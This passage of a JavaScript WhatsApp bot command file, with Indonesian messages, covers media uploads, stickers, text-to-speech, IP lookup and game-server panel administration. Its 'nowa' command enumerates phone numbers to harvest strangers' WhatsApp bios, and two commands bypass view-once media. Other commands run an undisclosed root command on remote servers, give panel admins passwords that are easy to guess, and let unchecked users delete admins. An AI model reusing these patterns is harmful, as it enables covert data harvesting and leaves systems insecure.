} catch (error) {
console.error('Error:', error);
m.reply('Terjadi kesalahan saat memproses video. Silakan coba lagi.');
}}
break

case 'tourl': {
if (!isOwner) return onlyOwn()
if (!isMediaa) return m.reply(`Kirim vidio/gambar dengan caption ${prefix+command}`)
let media = await rafatharcode.downloadAndSaveMediaMessage(quoted);
rafatharcode.sendMessage(m.chat, { react: { text: `🔎`, key: m.key }})
if (/image/.test(mime)) {
let anu = await TelegraPh(media);
m.reply(`Link: ${anu}`);
} if (/video/.test(mime)) {
let anu = await TelegraPh(media);
m.reply(`Link: ${anu}`);
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media);
m.reply(`Link: ${anu.url}`);
}
await fs.unlinkSync(media);
}
break

case 'tourl-v2':{
if (!isOwner) return onlyOwn()
if (!isMediaa) return rafatharcodereply(`Kirim vidio/gambar dengan caption ${prefix+command}`)
if (/video/.test(mime)) {
return rafatharcodereply('Hanya foto yang diijinkan')
}
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
async function downloadAndSaveMedia(media) {
 try {
 const tempDir = './temp';

 if (!fs.existsSync(tempDir)) {
 fs.mkdirSync(tempDir);
 }

 const fileName = `mediaFile_${Date.now()}.jpg`; 
 const filePath = path.join(tempDir, fileName);

 fs.writeFileSync(filePath, media);
 return filePath;
 } catch (error) {
 console.error('Error while saving media:', error);
 }
 }
let q = m.quoted ? m.quoted : m;
let media = await q.download();
try {
 await rafatharcode.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key } });
 let felpet = await downloadAndSaveMedia(media)
 const imageData = fs.readFileSync(felpet);
 let { directLink } = await service.uploadFromBinary(imageData, 'test.png');
 console.log(directLink);
 await m.reply('Link: ' + directLink)
 await rafatharcode.sendMessage(m.chat, { react: { text: `✅`, key: m.key }});
} catch (error) {
 return rafatharcodereply('error')
}
}
break

case 'tourl-v3': {
  if (!isOwner) return onlyOwn();
  
  const { rafatharcodev3 } = require('./rafatharcodev3.js');
  if (!/video/.test(mime) && !/image/.test(mime)) {
    return m.reply(`*PERMINTAAN ERROR!! PESAN :*\\n> *Reply/Send Gambar/Video Dengan Caption .tourl*`);
  }
  if (!quoted) {
    return m.reply(`*PERMINTAAN ERROR!! PESAN :*\\n> *Reply/Send Gambar/Video Dengan Caption .tourl*`);
  }
  let media = await rafatharcode.downloadAndSaveMediaMessage(quoted);
  let anu = await rafatharcodev3(media);
  if (anu && anu.status) {
    m.reply(JSON.stringify(anu, null, 2)); // Send the entire response as a formatted JSON string
  } else {
    m.reply(`*ERROR: Tidak dapat mengambil URL dari media.*`);
  }
  await fs.unlinkSync(media);
}
break

case 'qc':
case 'qcstick': {
if (!isOwner) return onlyOwn()
if (!args[0]) return m.reply(`Contoh: ${prefix+command} white halo`)
if (!args[1]) return m.reply(`Contoh: ${prefix+command} white halo`)
if (text.length > 80) return m.reply(`Maximal 80 karakter!`)
rafatharcode.sendMessage(m.chat, { react: { text: `🔎`, key: m.key }})
let [color, ...message] = text.split(' ');
message = message.join(' ');
let backgroundColor;
switch(color) {
case 'pink':
backgroundColor = '#f68ac9';
break;
case 'blue':
backgroundColor = '#6cace4';
break;
case 'red':
backgroundColor = '#f44336';
break;
case 'green':
backgroundColor = '#4caf50';
break;
case 'yellow':
backgroundColor = '#ffeb3b';
break;
case 'purple':
backgroundColor = '#9c27b0';
break;
case 'darkblue':
backgroundColor = '#0d47a1';
break;
case 'lightblue':
backgroundColor = '#03a9f4'; 
break;
case 'ash':
backgroundColor = '#9e9e9e';
break;
case 'orange':
backgroundColor = '#ff9800';
break;
case 'black':
backgroundColor = '#000000';
break;
case 'white':
backgroundColor = '#ffffff';
break;
case 'teal':
backgroundColor = '#008080';
break;
case 'lightpink':
backgroundColor = '#FFC0CB';
break;
case 'chocolate':
backgroundColor = '#A52A2A';
case 'salmon':
backgroundColor = '#FFA07A'; 
break; 
case 'magenta':
backgroundColor = '#FF00FF'; 
break; 
case 'tan':
backgroundColor = '#D2B48C'; 
break;
case 'wheat':
backgroundColor = '#F5DEB3'; 
break;
case 'deeppink':
backgroundColor = '#FF1493'; 
break; 
case 'fire':
backgroundColor = '#B22222';
break;
case 'skyblue':
backgroundColor = '#00BFFF';
break; 
case 'orange':
backgroundColor = '#FF7F50';
break;
case 'brightskyblue':
backgroundColor = '#1E90FF'; 
break; 
case 'hotpink':
backgroundColor = '#FF69B4'; 
break; 
case 'lightskyblue':
backgroundColor = '#87CEEB'; 
break; 
case 'seagreen':
backgroundColor = '#20B2AA'; 
break; 
case 'darkred':
backgroundColor = '#8B0000'; 
break; 
case 'orangered':
backgroundColor = '#FF4500'; 
break; 
case 'cyan':
backgroundColor = '#48D1CC'; 
break; 
case 'violet':
backgroundColor = '#BA55D3'; 
break; 
case 'mossgreen':
backgroundColor = '#00FF7F'; 
break; 
case 'darkgreen':
backgroundColor = '#008000'; 
break; 
case 'navyblue':
backgroundColor = '#191970'; 
break; 
case 'darkorange':
backgroundColor = '#FF8C00'; 
break; 
case 'darkpurple':
backgroundColor = '#9400D3'; 
break; 
case 'fuchsia':
backgroundColor = '#FF00FF'; 
break; 
case 'darkmagenta':
backgroundColor = '#8B008B'; 
break;
case 'darkgray':
backgroundColor = '#2F4F4F'; 
break;
case 'peachpuff':
backgroundColor = '#FFDAB9'; 
break;
case 'darkishgreen':
backgroundColor = '#BDB76B'; 
break;
case 'darkishred':
backgroundColor = '#DC143C'; 
break;
case 'goldenrod':
backgroundColor = '#DAA520'; 
break;
case 'darkishgray':
backgroundColor = '#696969'; 
break;
case 'darkishpurple':
backgroundColor = '#483D8B'; 
break;
case 'gold':
backgroundColor = '#FFD700'; 
break;
case 'silver':
backgroundColor = '#C0C0C0'; 
break;
default:
return m.reply('Warna tersebut tidak ditemukan!')
}
let obj = {
type: 'quote',
format: 'png',
backgroundColor,
width: 512,
height: 768,
scale: 2,
messages: [
{
entities: [],
avatar: true,
from: {
id: 1,
name: pushname,
photo: { 
url: await rafatharcode.profilePictureUrl(m.sender, "image").catch(() => 'https://telegra.ph/file/2324daab2ea7ce51596fa.jpg'),
} },
text: message,
replyMessage: {},
}, ],
};
let response = await axios.post('https://quotly.netorare.codes/generate', obj, {
headers: {
'Content-Type': 'application/json', },
});
let buffer = Buffer.from(response.data.result.image, 'base64');
rafatharcode.sendImageAsSticker(m.chat, buffer, m, { packname: ``, author: `${author}`})
}
break

case 'qckode':
case 'kodeqc': {
if (!isOwner) return onlyOwn()
m.reply(`${monospace("LIST  WARNA")}\n\n• Pink\n• Blue\n• Red\n• Green\n• Yellow\n• Purple\n• Darkblue\n• Lightblue\n• Ash\n• Orange\n• black\n• White\n• Teal\n• Lightpink\n• Chocolate\n• Salmon\n• Magenta\n• Tan\n• Wheat\n• Deeppink\n• Fire\n• Skyblue\n• Safron\n• Brightskyblue\n• Hotpink\n• Lightskyblue\n• Seagreen\n• Darkred\n• Orangered\n• Cyan\n• Violet\n• Mossgreen\n• Darkgreen\n• Navyblue\n• Darkorange\n• Darkpurple\n• Fuchsia\n• Darkmagenta\n• Darkgray\n• Peachpuff\n• Plackishgreen\n• Darkishred\n• Goldenrod\n• Darkishgray\n• Darkishpurple\n• Gold\n• Silver`)
}
break

case 's':
case 'stiker':
case 'sticker': {
if (!isOwner) return onlyOwn()
if (!quoted) return m.reply(`Kirim/kutip gambar dengan caption ${prefix+command}`)
rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
if (/image/.test(mime)) {
let media = await rafatharcode.downloadAndSaveMediaMessage(quoted, + new Date * 1)
await rafatharcode.imgToSticker(m.chat, media, m, { packname: `` , author: author })
await fs.unlinkSync(media)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 25) return m.reply('Maksimal 25 detik!')
let media = await rafatharcode.downloadAndSaveMediaMessage(quoted, + new Date * 1)
await rafatharcode.vidToSticker(m.chat, media, m, { packname: `` , author: author })
await fs.unlinkSync(media)
} else if (/sticker/.test(mime)) {
let media = await rafatharcode.downloadAndSaveMediaMessage(quoted, + new Date * 1)
await rafatharcode.sendStickerFromUrl(m.chat, media, m, {packname: `` , author: author })
await fs.unlinkSync(media)
} else m.reply(`Kirim/kutip gambar dengan caption ${prefix+command}`)
}
break

case 'toimage':
            case 'toimg': {
            if (!isOwner) return onlyOwn()
                if (!/webp/.test(mime)) return rafatharcodereply(`Reply sticker with caption *${prefix + command}*`)
                rafatharcodereply('```Waitt Sedang Kami Proses...```')
                let media = await rafatharcode.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    rafatharcode.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: m
                    })
                    fs.unlinkSync(ran)
                })

            }
            break

case 'smeme': {
if (!isOwner) return onlyOwn()
if (!/webp/.test(mime) && /image/.test(mime)) {
rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await rafatharcode.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`
let stiker = await sticker5(smeme, false, ``, author)
if (stiker) return rafatharcode.sendFile(m.chat, stiker, 'Quotly.webp', '', m)
} else {
m.reply(`Kirim/kutip gambar dengan caption ${prefix+command} San|Abc`)
}}
break

case 'wm':
case 'swm': {
if (!isOwner) return onlyOwn()
if (!quoted) return m.reply(`Kirim/kutip stiker lalu ketik ${prefix+command} San|Abc`)
teks1 = text.split('|')[0] ? text.split('|')[0] : ''
teks2 = text.split('|')[1] ? text.split('|')[1] : ''
rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
if (/image/.test(mime)) {
let media = await quoted.download()
let stiker = await sticker5(media, false, `${teks1}`, `${teks2}`)
if (stiker) return rafatharcode.sendFile(m.chat, stiker, 'Quotly.webp', '', m)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 25) return m.reply('Maksimal 25 detik!')
let media = await quoted.download()
let stiker = await sticker5(media, false, `${teks1}`, `${teks2}`)
if (stiker) return rafatharcode.sendFile(m.chat, stiker, 'Quotly.webp', '', m)
} else {
m.reply(`Kirim/kutip stiker lalu ketik ${prefix+command} San|Abc`)
}}
break

case 'gtts':
case 'say': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} aku sayang toya`)
await rafatharcode.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})
let anu = await fetchJson(`https://api.erdwpe.com/api/soundoftext?text=${text}&lang=id-ID`)
const aud = anu.result
rafatharcode.sendMessage(m.chat, {audio : {url : aud}, mimetype:'audio/mpeg', ptt: true}, {quoted:m})
}
break

case 'gtts2':
case 'say2': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} aku sayang toya`)
await rafatharcode.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})
var lang = text.split("--")[1]
if (!lang) lang = 'id'
long = 'id'
function tts(text, long = 'id') {
return new Promise((resolve, reject) => {
try {
let tts = gtts(long)
let filePath = path.join(__dirname, './lib', (1 * new Date) + '.wav')
tts.save(filePath, text, () => {
resolve(fs.readFileSync(filePath))
fs.unlinkSync(filePath)
})
} catch (e) { reject(e) }
})
}
let res
try { res = await tts(text, long) }
catch (e) {
m.reply(e + '')
res = await tts(text)
} finally {
rafatharcode.sendMessage(m.chat, {audio: res, mimetype: 'audio/mpeg', ptt: true}, {quoted: m})
}}
break

case 'readvo': 
case 'rvo': {
if (!isOwner) return onlyOwn()
if (!m.quoted) return m.reply('Kirim/kutip vidio/gambar')
if (m.quoted.mtype !== 'viewOnceMessageV2') return m.reply('Ini bukan pesan view once!')
let msg = m.quoted.message
let type = Object.keys(msg)[0]
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
let buffer = Buffer.from([])
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])}
rafatharcode.sendMessage(m.chat, { react: { text: `🔎`, key: m.key }})
if (/video/.test(type)) {
return rafatharcode.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
} else if (/image/.test(type)) {
return rafatharcode.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
}
}
break

case 'bukavn': {
if (!isOwner) return onlyOwn()
if (!isQuotedViewOnce) return reply('Reply viewonce')
let type = Object.keys(m.quoted.message)[0]
let quotedType = m.quoted.message[type]
var media = await downloadContentFromMessage(quotedType, type == "audioMessage" ? "audio" : "image")
let buffer = Buffer.from([])
for await (let chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
if (/audio/.test(type)) {
await rafatharcode.sendMessage(m.chat, { audio: buffer, mimetype: 'audio/mp4', ptt: true}, {quoted: m})}
}
break

case 'getvideo': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} 1`)
if (!m.quoted) return m.reply('Reply pesan ytsearch bot!')
let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) return m.reply(`Mungkin pesan yang kamu reply tidak mengandung hasil ytsearch`)
await rafatharcode.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})
downloadMp4(urls[text - 1])
}
break

case 'getmusic': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} 1`)
if (!m.quoted) return m.reply('Reply pesan ytsearch bot!')
let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) return m.reply(`Mungkin pesan yang kamu reply tidak mengandung hasil ytsearch`)
await rafatharcode.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})
downloadMp3(urls[text - 1])
}
break

case 'cekodam':
case 'cekkodam':
case 'cekkhodam': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} toya`)
const khodam = pickRandom([
"Kaleng Cat Avian",
"Pipa Rucika",
"Botol Tupperware",
"Badut Mixue",
"Sabun GIV",
"Sandal Swallow",
"Jarjit",
"Ijat",
"Fizi",
"Mail",
"Ehsan",
"Upin",
"Ipin",
"Sungut Lele",
"Tok Dalang",
"Opah",
"Opet",
"Alul",
"Pak Vinsen",
"Maman Resing",
"Pak RT",
"Admin ETI",
"Bung Towel",
"Lumpia Basah",
"Martabak Manis",
"Baso Tahu",
"Tahu Gejrot",
"Dimsum",
"Seblak Ceker",
"Telor Gulung",
"Tahu Aci",
"Tempe Mendoan",
"Nasi Kucing",
"Kue Cubit",
"Tahu Sumedang",
"Nasi Uduk",
"Wedang Ronde",
"Kerupuk Udang",
"Cilok",
"Cilung",
"Kue Sus",
"Jasuke",
"Seblak Makaroni",
"Sate Padang",
"Sayur Asem",
"Kromboloni",
"Marmut Pink",
"Belalang Mullet",
"Kucing Oren",
"Lintah Terbang",
"Singa Paddle Pop",
"Macan Cisewu",
"Vario Mber",
"Beat Mber",
"Supra Geter",
"Oli Samping",
"Knalpot Racing",
"Jus Stroberi",
"Jus Alpukat",
"Alpukat Kocok",
"Es Kopyor",
"Es Jeruk",
"Cappucino Cincau",
"Jasjus Melon",
"Teajus Apel",
"Pop ice Mangga",
"Teajus Gulabatu",
"Air Selokan",
"Air Kobokan",
"TV Tabung",
"Keran Air",
"Tutup Panci",
"Kotak Amal",
"Tutup Termos",
"Tutup Botol",
"Kresek Item",
"Kepala Casan",
"Ban Serep",
"Kursi Lipat",
"Kursi Goyang",
"Kulit Pisang",
"Warung Madura",
"Gorong-gorong",
"Tai Kuda",
"Tikus Kentut",
"Banteng Merah",
"Bajigur",
"Bakso Sumatra",
"Neymar Bogor",
"Christiano Rojali",
"Batagor",
"Seblak Kalimantan",
"Macan Putih",
"Harimau Sumatra",
"Harimau Putih",
"Singa",
"Raja Iblis",
"Telur Betawi",
"Cilok Goreng",
])
const response = `
${monospace("CEK  KHODAM")}
- Nama: ${text}
- Khodam: ${khodam}
`
m.reply(response)
try{
let tek = `Khodam nya ${text}, adalah: ${khodam}`
let anu = await fetchJson(`https://api.erdwpe.com/api/soundoftext?text=${tek}&lang=id-ID`)
const aud = anu.result
await sleep(50)
rafatharcode.sendMessage(m.chat, {audio : {url : aud}, mimetype:'audio/mpeg', ptt: true}, {quoted:m})
} catch(err) {
m.reply('Terjadi kesalahan')
}}
break

case 'cekasalmember': {
  if (!isOwner) return onlyOwn()
  if (!m.isGroup) return onlyGrup()
  const participants = await rafatharcode.groupMetadata(m.chat).then(metadata => metadata.participants);
  let countIndonesia = 0;
  let countMalaysia = 0;
  let countUSA = 0;
  let countOther = 0;
  participants.forEach(participant => {
    const phoneNumber = participant.id.split('@')[0];
    if (phoneNumber.startsWith("62")) {
      countIndonesia++;
    } else if (phoneNumber.startsWith("60")) {
      countMalaysia++;
    } else if (phoneNumber.startsWith("1")) {
      countUSA++;
    } else if (phoneNumber.startsWith("+1")) {
      countOther++;
    } else {
      countOther++;
    }
  });
  const replyMessage = `Jumlah Anggota Grup Berdasarkan Negara:\n\nAnggota Indonesia: ${countIndonesia} 🇮🇩\nAnggota Malaysia: ${countMalaysia} 🇲🇾\nAnggota USA + OTHER : ${countUSA} 🇺🇲\nAnggota Negara Lain: ${countOther} 🏳️`;
  reply(replyMessage);
  }
  break

case 'cek-provider':{
if (!isOwner) return onlyOwn()
const noTelp = require('no-telp');
      try {
         if (!args || !args[0]) {
            return rafatharcodereply(m.chat, `• *Example :* ${prefix + command} 6283183432282`, m);
         }

         const nomorTelp = args[0];
         const result = noTelp.getOperator(nomorTelp, true); // Menggunakan validasi karakter

         const caption = `*✅ C E K - P R O V I D E R*\n\n`
            + `○ *Nomor Telepon:* ${nomorTelp}\n`
            + `○ *Operator:* ${result.operator}\n`
            + `○ *Kartu:* ${result.card}\n`
            + `○ *Message:* ${result.message}\n`
            + `○ *Valid:* ${result.valid ? 'Yes' : 'No'}`;
         
         rafatharcodereply(m.chat, caption, m);
      } catch (e) {
         console.error(e);
         rafatharcodereply(m.chat, Func.jsonFormat(e), m);
      }
   }
break 

case 'nowa': {
if (!isOwner) return onlyOwn()
if (!q) return rafatharcodereply(`Kirim perintah ${prefix+command} <nomer>`)
var noteks = q
if (!noteks.includes('x')) return reply('Salah Browww')
reply('_Waitt Sedang Kami Proses..._')
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = noteks.split('x')[0]
var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')] : ''
var random_length = countInstances(noteks, 'x')
var random;
if (random_length == 1) {
random = 10
} else if (random_length == 2) {
random = 100
} else if (random_length == 3) {
random = 1000
}
var nomerny = `LIST NOMER WHATSAPP\n\nPunya Bio/status/info\n`
var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
var no_watsap = `\nTidak Terdaftar\n`
for (let i = 0; i < random; i++) {
var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
var dom1 = nu[Math.floor(Math.random() * nu.length)]
var dom2 = nu[Math.floor(Math.random() * nu.length)]
var dom3 = nu[Math.floor(Math.random() * nu.length)]
var dom4 = nu[Math.floor(Math.random() * nu.length)]
var rndm;
if (random_length == 1) {
rndm = `${dom1}`
} else if (random_length == 2) {
rndm = `${dom1}${dom2}`
} else if (random_length == 3) {
rndm = `${dom1}${dom2}${dom3}`
} else if (random_length == 4) {
rndm = `${dom1}${dom2}${dom3}${dom4}`
}
var anu = await rafatharcode.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
var anuu = anu.length !== 0 ? anu : false
try {
try {
var anu1 = await rafatharcode.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
} else {
nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBiography : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
} catch {
no_watsap += `${nomer0}${i}${nomer1}\n`
}
}
reply(`${nomerny}${no_bio}${no_watsap}`)
}
break

case 'myip': {
if (!isOwner) return onlyOwn()
var http = require('http')
http.get({
'host': 'api.ipify.org',
'port': 80,
'path': '/'
}, function(resp) {
resp.on('data', function(ip) {
reply("🔎 My public IP address is: " + ip);
})
})
}
break

case 'cekip': {
if (!isOwner) return onlyOwn()
                if (!q) return rafatharcodereply("Example:\n " + (prefix + command) + " <ip>");

                try {
                    let data = await fetchJson(`https://ipapi.co/${q}/json/`);
                    if (data.reason) return reply(data.reason);

                    let txt = `
*IP Information:*
- IP Address: ${data.ip}
- Network: ${data.network}
- Version: ${data.version}
- City: ${data.city}
- Region: ${data.region} (${data.region_code})
- Country: ${data.country_name} (${data.country_code_iso3})
- Latitude: ${data.latitude}
- Longitude: ${data.longitude}
- Timezone: ${data.timezone}
- Organization: ${data.org}
- ASN: ${data.asn}
- Currency: ${data.currency_name} (${data.currency})
- Country Calling Code: ${data.country_calling_code}
- Languages: ${data.languages}
- Population: ${data.country_population.toLocaleString()}
- Area: ${data.country_area.toLocaleString()} km²`;
                    return reply(txt.trim());
                } catch (error) {
                    return rafatharcodereply("An error occurred while fetching the IP data.");
                }
            }
                break;           
// ==========================

case 'resetpwvps': {
if (!isOwner) return onlyOwn();
 
 let t = text.split(',');
 if (t.length < 2) return rafatharcodereply(`*Format salah!*\nPenggunaan: ${prefix}resetpwvps ipvps,password,paswordbaru`)
 
 let ipvps = t[0];
 let passwd = t[1];
 let pw = t[2];
 const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
 };

 // Gunakan string terenkripsi di kode Anda
 const command = `${global.bash}`
 const conn = new Client();
 
 conn.on('ready', () => {
 isSuccess = true; // Set flag menjadi true jika koneksi berhasil
 rafatharcodereply('*UBAH PASSWORD VPS DIMULAI*');
 
 conn.exec(command, (err, stream) => {
 if (err) throw err;
 stream.on('close', (code, signal) => {
 console.log('Stream closed with code ' + code + ' and signal ' + signal);
 m.reply(`*BERIKUT DATA VPS ANDA*\n\n*IP VPS* : ${ipvps}\n*PW VPS* : ${pw}\n\n*NOTES:*\nSIMPAN DATA VPS SECARA BAIK² JANGAN SAMPAI HILANG TERIMAKASIH🥰`)
 conn.end();
 }).on('data', (data) => {
 stream.write(`${global.tokeninstall}\n`);
 stream.write('8\n');
 stream.write(`${pw}\n`)
 stream.write(`${pw}\n`);
 console.log('STDOUT: ' + data);
 }).stderr.on('data', (data) => {
 console.log('STDERR: ' + data);
 });
 });
 }).on('error', (err) => {
 console.log('Connection Error: ' + err);
 m.reply('Katasandi atau IP tidak valid');
 }).connect(connSettings);
 }
break

case 'npms':{
 if (!isOwner) return onlyOwn()
	if (!text) return m.reply('Input Query')
	let res = await fetch(`http://registry.npmjs.com/-/v1/search?text=${text}`)
	let { objects } = await res.json()
	if (!objects.length) throw `Query "${text}" not found :/`
	let txt = objects.map(({ package: pkg }) => {
		return `*${pkg.name}* (v${pkg.version})\n_${pkg.links.npm}_\n_${pkg.description}_`
	}).join`\n\n`
	m.reply(txt)
}
break

case 'cadmin-prib': {
if (!isOwner && !isOwner2) return onlyOwn()
let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return rafatharcodereply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return rafatharcodereply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return rafatharcodereply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "admin"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain_prib + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey_prib
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true, 
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: user

📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}`
 const listMessage = {

 text: tks,

 }

	

 await rafatharcode.sendMessage(m.chat, listMessage)

 await rafatharcode.sendMessage(nomornya, {

 text: `*BERIKUT DETAIL AKUN ADMIN PANEL ANDA*\n

👤USERNAME : ${username}
🔑PASSWORD: ${password}
🌐LOGIN: ${domain_prib}

*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*

© RafatharCode
`,

 })

} 
break

case 'deladmin-prib': {
if (!args[0]) return m.reply(`Untuk melihat ID silahkan ketik ${prefix}listadmin`)
let cek = await fetch(domain_prib + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey_prib
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain_prib + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey_prib
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("ID admin tidak ditemukan!")
m.reply(`Berhasil del admin panel *${capital(getid)}*`)
}
break

case 'listserver-prib': {
if (!isOwner) return onlyOr()
let page = args[0] ? args[0] : '1';
let f = await fetch(domain_prib + "/api/application/servers?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey_prib
}
});
let res = await f.json();
let servers = res.data;
let sections = [];
let messageText = "Berikut list server nya:\n\n";
for (let server of servers) {
let s = server.attributes; 
let f3 = await fetch(domain_prib + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey_prib
}
});
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `ID server: ${s.id}\n`;
messageText += `Nama server: ${s.name}\n`;
messageText += `Status: ${status}\n\n`;
}
messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
messageText += `Total server: ${res.meta.pagination.count}`;
await rafatharcode.sendMessage(m.chat, { text: messageText }, { quoted: m });
if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
rafatharcodereply(`Contoh: ${prefix+command} ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya`);
}
}
break

case 'delserver-prib': {
if (!isOwner) return onlyOr()
let srv = args[0]
if (!srv) return m.reply('ID nya mana?')
let f = await fetch(domain_prib + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey_prib,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('Server tidak ditemukan!')
m.reply('Sukses menghapus server!')
}
break

case 'listuser-prib': {
if (!isOwner) return onlyOr()
let page = args[0] ? args[0] : '1';
let f = await fetch(domain_prib + "/api/application/users?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey_prib
}
});
let res = await f.json();
let users = res.data;
let messageText = "Berikut list user nya:\n\n";
for (let user of users) {
let u = user.attributes;
messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Tidak aktif' : 'Aktif'}\n`;
messageText += `${u.username}\n`;
messageText += `${u.first_name} ${u.last_name}\n\n`;
}
messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
messageText += `Total user: ${res.meta.pagination.count}`;
await rafatharcode.sendMessage(m.chat, { text: messageText }, { quoted: m });
if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
m.reply(`Contoh: ${prefix+command} ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya`);
}
}
break

//tanaka sense 


case 'upch-audio':{
 if (!isOwner) return onlyOwn()
if (!/audio/.test(mime)) return rafatharcodereply(`Use ${prefix+command} Judul Lagu|Terserah\nExample ${prefix+command} Mungkin | Kita Sad Dulu`) 
 rafatharcode.sendMessage(`${global.idch}`, { react: { text: '🕐', key: m.key }})
 ngawi = text.split("|")[0]
 jomokck = text.split("|")[1]
 await sleep(6000)
rafatharcode.sendMessage(m.chat,{audio: await quoted.download(),mimetype: 'audio/mp4',ptt: true,
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 9999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: '120363318521671268@newsletter',
serverMessageId: 20,
